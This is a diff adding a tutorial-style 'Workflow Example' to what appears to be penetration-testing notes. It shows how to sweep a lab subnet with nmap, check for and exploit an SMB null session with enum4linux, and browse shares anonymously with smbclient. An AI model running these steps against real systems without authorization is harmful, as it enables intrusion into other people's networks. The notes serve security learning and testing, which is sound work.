@@ -266,3 +266,52 @@ run all commands in a single promt:
 
 </details>
 <br/>
+
+
+<details> 
+  <summary> <b>Workflow Example</b> </summary>
+
+<H4> 1. Find a Target in the Network</H4>
+
+Verify the remote network:
+
+```bash
+$ ifconfig
+```
+
+Discover alive hosts on target network:
+
+```bash
+$ nmap -sn 192.168.99.0/24
+```
+
+
+<H4> 2. Check for Null Session</H4>
+
+```bash
+$ enum4linux -n 192.168.99.162
+```
+
+→ watch out for an active File Server Service and that the string <20> appears in the list.
+
+
+<H4> 3. Exploit Null Session</H4>
+
+Gather information
+
+```bash
+$ enum4linux -a 192.168.99.162
+```
+
+Use Smbclient to navigate the target machine.
+
+```bash
+$ smbclient -L DOMAIN -I 192.168.99.162 -N -U “”
+
+[...]
+
+ smb: \> ls 
+ smb: \> exit
+```
+</details>
+<br/>
